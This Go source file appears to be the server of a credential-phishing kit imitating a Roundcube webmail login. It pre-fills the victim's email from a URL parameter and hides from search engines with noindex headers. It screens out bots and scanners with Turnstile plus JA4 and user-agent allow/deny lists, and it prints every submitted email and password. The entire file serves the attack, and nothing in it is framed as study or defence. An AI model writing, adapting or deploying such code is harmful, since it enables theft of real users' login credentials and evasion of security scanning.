package main

import (
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"path/filepath"

	"github.com/joho/godotenv"
	"github.com/lulexhostt/authapp/middlewares"
	"gopkg.in/yaml.v2"
)

// BotGuardConfig defines the structure for the YAML configuration.
type BotGuardConfig struct {
	MinVer string `yaml:"min_ver"`
	Ja4    struct {
		Allow []struct {
			B string `yaml:"b"`
		} `yaml:"allow"`
		Deny []struct {
			B string `yaml:"b"`
		} `yaml:"deny"`
	} `yaml:"ja4"`
	UserAgent struct {
		Allow []struct {
			Browser string `yaml:"browser"`
			Version string `yaml:"version"`
		} `yaml:"allow"`
		Deny []struct {
			Browser string `yaml:"browser"`
		} `yaml:"deny"`
	} `yaml:"user_agent"`
}

// loadConfig loads the BotGuard YAML configuration file.
func loadConfig() (*BotGuardConfig, error) {
	configPath, err := filepath.Abs("config/botguard.yaml")
	if err != nil {
		return nil, err
	}
	data, err := os.ReadFile(configPath)
	if err != nil {
		return nil, err
	}
	var config BotGuardConfig
	err = yaml.Unmarshal(data, &config)
	if err != nil {
		return nil, err
	}
	return &config, nil
}

// setCSP sets the Content Security Policy header for security.
func setCSP(w http.ResponseWriter) {
	w.Header().Set("Content-Security-Policy", "default-src 'self' https://logo.clearbit.com; img-src 'self' https://image.thum.io https://roundcube.secure.ne.jp https://i.imgur.com https://logo.clearbit.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://ajax.googleapis.com https://challenges.cloudflare.com; style-src 'self' 'unsafe-inline'; connect-src 'self' https://logo.clearbit.com https://image.thum.io https://sportnafizioterapija.si; frame-src https://challenges.cloudflare.com;")
}

// setNoIndexHeaders sets the noindex headers for the auth.html response.
func setNoIndexHeaders(w http.ResponseWriter) {
	w.Header().Set("X-Robots-Tag", "noindex, nofollow, nosnippet")
}

// challengeHandler serves the Turnstile CAPTCHA challenge page.
func challengeHandler(w http.ResponseWriter, r *http.Request) {
	setCSP(w)

	// Attempt to load and render the challenger.html template
	tmpl, err := template.ParseFiles("templates/challenger.html")
	if err != nil {
		fmt.Println("Error loading challenger.html template:", err) // Logs the error for debugging
		http.Error(w, "Unable to load challenge template", http.StatusInternalServerError)
		return
	}

	// Extract the email query parameter, if available
	email := r.URL.Query().Get("sync")

	// Render the template with the email data
	if err := tmpl.Execute(w, map[string]interface{}{"Email": email}); err != nil {
		fmt.Println("Error rendering challenge template:", err) // Logs the rendering error if any
		http.Error(w, "Error rendering challenge template", http.StatusInternalServerError)
		return
	}
}

// authHandler handles the login form submission after Turnstile validation.
func authHandler(w http.ResponseWriter, r *http.Request) {
	setCSP(w)
	setNoIndexHeaders(w) // Set noindex headers for the auth.html response

	if r.Method == http.MethodPost {
		r.ParseForm()
		email := r.FormValue("rcmloginuser")
		password := r.FormValue("rcmloginpwd")
		fmt.Printf("Email: %s, Password: %s\n", email, password)
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		return
	}

	// Render the auth.html form template for GET requests
	tmpl, err := template.ParseFiles("templates/auth.html")
	if err != nil {
		http.Error(w, "Unable to load auth template", http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, nil)
}

func main() {
	// Load environment variables from .env file
	err := godotenv.Load()
	if err != nil {
		log.Fatalf("Error loading .env file: %v", err)
	}

	// Load the BotGuard configuration
	config, err := loadConfig()
	if err != nil {
		log.Fatalf("Error loading config: %v", err)
	}
	fmt.Printf("Loaded BotGuard config: %+v\n", config)

	// Set up routes and middlewares
	mux := http.NewServeMux()

	// Serve static assets
	mux.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))

	// Enforce Turnstile challenge on the auth route
	mux.Handle("/auth", middlewares.TurnstilePreloadMiddleware(http.HandlerFunc(authHandler)))

	// Handle the challenge route without middleware to avoid redirect loops
	mux.HandleFunc("/challenger.html", challengeHandler)

	// Enforce Turnstile challenge on all other routes
	mux.Handle("/", middlewares.TurnstilePreloadMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Log unauthorized access attempts
		fmt.Printf("Unauthorized access attempt to %s\n", r.URL.Path)
		http.NotFound(w, r)
	})))

	// Start the server on port 8080
	fmt.Println("Server is running on port 8082...")
	log.Fatal(http.ListenAndServe(":8082", mux))
}
